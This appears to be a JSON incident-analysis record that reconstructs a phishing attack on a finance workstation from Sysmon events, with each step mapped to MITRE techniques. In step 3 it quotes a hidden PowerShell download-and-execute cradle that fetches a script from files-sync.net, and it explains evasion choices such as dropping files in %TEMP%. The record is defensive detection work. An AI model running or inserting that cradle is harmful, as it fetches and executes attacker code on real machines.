{
  "severity": "high",
  "network_observations": [
    {"ip": "10.30.6.78", "inferred_role": "finance_endpoint_phishing_target", "first_seen": "2027-06-02T10:11:24+0200", "last_seen": "2027-06-02T10:11:48+0200", "agent_name": "WS-FIN-12"},
    {"ip": "45.95.169.42", "inferred_role": "external_attacker_c2_second_stage_host", "first_seen": "2027-06-02T10:11:36+0200", "last_seen": "2027-06-02T10:11:42+0200"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Initial Access / User Execution", "technique": "T1566.001 + T1204.002", "what_happened": "At 2027-06-02 10:11:24 CEST, Sysmon Event 1 fired on WS-FIN-12 (10.30.6.78): outlook.exe opened the attachment Payment_Advice_0625.xlsm under user=CORP\\nabila.r. nabila.r is a finance department user (prime phishing target — receives payment-related emails as part of normal job). The .xlsm extension carries VBA macros — the high-risk Office file type that a finance user has plausible reason to open.", "chain_reason": "Sysmon Event 1: image=outlook.exe + commandLine references Payment_Advice_0625.xlsm + user=CORP\\nabila.r. Outlook attachment-open event is the entry into the chain.", "first_seen": "2027-06-02T10:11:24+0200"},
    {"step": 2, "tactic": "Execution / Office Macro", "technique": "T1204.002 + T1059.005", "what_happened": "At 10:11:31 CEST (7 seconds after attachment open), Sysmon Event 1 fired on WS-FIN-12: excel.exe launched with parentImage=outlook.exe, image=C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\EXCEL.EXE, user=CORP\\nabila.r. Excel opens the .xlsm. If the workbook contains a VBA AutoOpen / Workbook_Open macro AND the user dismisses (or has previously dismissed) the macro-warning banner, the macro executes automatically.", "chain_reason": "Sysmon Event 1: parentImage=outlook.exe + image=EXCEL.EXE — legitimate office-app launch path but high-risk because the source is an email attachment, not a SharePoint/OneDrive trusted location.", "first_seen": "2027-06-02T10:11:31+0200"},
    {"step": 3, "tactic": "Execution / Command Interpreter (SMOKING GUN)", "technique": "T1059.001 + T1204.002", "what_happened": "At 10:11:32 CEST (1 second after Excel launched), Sysmon Event 1 fired on WS-FIN-12: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://files-sync.net/p.ps1')\" with parentImage=EXCEL.EXE, user=CORP\\nabila.r. This is the canonical macro-triggered download cradle: -ExecutionPolicy Bypass (sidesteps PS policy), -WindowStyle Hidden (no visible console — defense evasion), IEX(New-Object Net.WebClient).DownloadString(...) (download-and-execute primitive, no file written until later step). Office spawning powershell.exe is the textbook smoking-gun parent-child anomaly: Word/Excel/PowerPoint NEVER legitimately launch script interpreters in normal user workflows. This is the SINGLE highest-confidence detection in the entire modern Windows phishing kill chain.", "chain_reason": "Sysmon Event 1: parentImage=EXCEL.EXE + image=powershell.exe + commandLine contains 'ExecutionPolicy Bypass' + 'WindowStyle Hidden' + 'IEX' + 'DownloadString' + 'http://files-sync.net'. The (Office → script-interpreter) parent-child anomaly is the smoking-gun primitive.", "first_seen": "2027-06-02T10:11:32+0200"},
    {"step": 4, "tactic": "Command and Control / DNS", "technique": "T1071.001 + T1071.004", "what_happened": "At 10:11:34 CEST, Sysmon Event 22 (DNS query) fired on WS-FIN-12: queryName=files-sync.net resolved to 45.95.169.42. files-sync.net is a freshly-registered, low-reputation domain mimicking a legitimate file-sync service name pattern — typical attacker masquerade. The domain resolution is initiated by the powershell.exe process spawned in step 3.", "chain_reason": "Sysmon Event 22: image=powershell.exe + queryName=files-sync.net + queryResults contains 45.95.169.42.", "first_seen": "2027-06-02T10:11:34+0200"},
    {"step": 5, "tactic": "Command and Control / Web Download", "technique": "T1071.001 + T1105", "what_happened": "At 10:11:36 CEST, Sysmon Event 3 (network connection) fired on WS-FIN-12: powershell.exe initiated an outbound TCP connection to 45.95.169.42:80 (plaintext HTTP — defense evasion via lack of TLS, attacker accepts the lower-confidentiality tradeoff for simpler infrastructure). This is the second-stage download fetch.", "chain_reason": "Sysmon Event 3: image=powershell.exe + sourceIp=10.30.6.78 + destinationIp=45.95.169.42 + destinationPort=80.", "first_seen": "2027-06-02T10:11:36+0200"},
    {"step": 6, "tactic": "Ingress Tool Transfer", "technique": "T1105", "what_happened": "At 10:11:42 CEST, Sysmon Event 11 (file create) fired on WS-FIN-12: targetFilename=C:\\Users\\nabila.r\\AppData\\Local\\Temp\\p.ps1. The second-stage script was written to %TEMP% — a writable, low-permission, attacker-favored drop location. %TEMP% is whitelisted by most application-control policies because legitimate apps use it constantly = perfect blend-in.", "chain_reason": "Sysmon Event 11: image=powershell.exe + targetFilename matches *\\AppData\\Local\\Temp\\*.ps1.", "first_seen": "2027-06-02T10:11:42+0200"},
    {"step": 7, "tactic": "Execution / Second-Stage", "technique": "T1059.001", "what_happened": "At 10:11:48 CEST, Sysmon Event 1 fired on WS-FIN-12: powershell.exe -File C:\\Users\\nabila.r\\AppData\\Local\\Temp\\p.ps1 with parentImage=powershell.exe (the first-stage PS), user=CORP\\nabila.r. The second-stage script is loaded into a new PowerShell session — typical fileless-style chained execution. The second-stage payload content is unknown at this stage of the investigation (likely contains the actual implant: AMSI bypass + reflective DLL load OR Cobalt-Strike-style beacon OR commodity infostealer).", "chain_reason": "Sysmon Event 1: parentImage=powershell.exe + image=powershell.exe + commandLine contains '-File' + 'p.ps1' + the targetFilename from step 6.", "first_seen": "2027-06-02T10:11:48+0200"}
  ],
  "time_window": {"start": "2027-06-02T10:11:24+0200", "end": "2027-06-02T10:11:48+0200"},
